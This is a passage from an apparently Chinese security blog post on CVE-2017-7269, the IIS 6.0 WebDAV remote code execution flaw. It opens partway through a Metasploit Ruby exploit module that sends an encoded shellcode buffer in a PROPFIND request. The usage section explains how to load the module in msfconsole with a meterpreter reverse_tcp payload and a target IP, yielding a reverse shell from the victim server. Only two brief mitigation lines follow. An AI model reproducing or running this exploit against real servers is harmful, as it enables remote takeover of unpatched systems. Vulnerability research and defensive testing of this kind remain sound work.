<span class="n">buf1</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81</span><span class="s2">&#34;</span>
<span class="n">buf1</span> <span class="o">&lt;&lt;</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;PROPFIND / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">Host: localhost</span><span class="se">\r\n</span><span class="s2">Content-Length: 0</span><span class="se">\r\n</span><span class="s2">#{buf1}&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">handler</span>
<span class="n">disconnect</span>
<span class="n">end</span>
</code></pre></div><h2 id="usage">Usage</h2>
<p>新建一个文件名为cve-2017-7269.rb，把上面的exp复制进去，然后放进kali的/usr/share/metasploit-framework/modules/exploits/windows/iis目录里面。</p>
<p>然后打开msfconsole，输入：use exploits/windows/iis/cve-2017-7269加载模块。</p>
<blockquote>
<p>use exploit/windows/iis/cve-2017-7269  /<em>加载exp</em>/
set PAYLOAD windows/meterpreter/reverse_tcp /<em>加载payload</em>/
show options /<em>查看利用条件</em>/
set RHOST 192.168.4.244 /<em>RHOST 是目标ip</em>/
exploit /<em>开始攻击</em>/</p>
</blockquote>
<p>运行exploit，会在本机监听4444端口，存在漏洞的目标服务器会连上本机的4444端口，反弹一个meterpreter。（前提是目标服务器能够ping通本机）
通过meterpreter执行shell命令，反弹cmdshell</p>
<h1 id="临时解决办法">临时解决办法</h1>
<ul>
<li>关闭WebDAV服务</li>
<li>使用相关防护设备</li>
</ul>
<p>想了解更多：</p>
<p><a href="http://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/">http://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/</a> IIS6.0远程命令执行漏洞(CVE-2017-7269)</p>
<p><a href="http://www.bugbank.cn/q/article/58db782bda1bd80f5f6a85cc.html">http://www.bugbank.cn/q/article/58db782bda1bd80f5f6a85cc.html</a>  IIS6.0 CVE-2017-7269 反弹shell</p>
<p><a href="http://m.bobao.360.cn/learning/detail/3664.html">http://m.bobao.360.cn/learning/detail/3664.html</a>   CVE-2017-7269：IIS6.0远程代码执行漏洞分析及Exploit</p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/struts2-vulnerability-poc-summary/">
            Struts2漏洞POC汇总
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes/">
            FineCMS最新版5.0.8两处getshell(每天一洞)
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>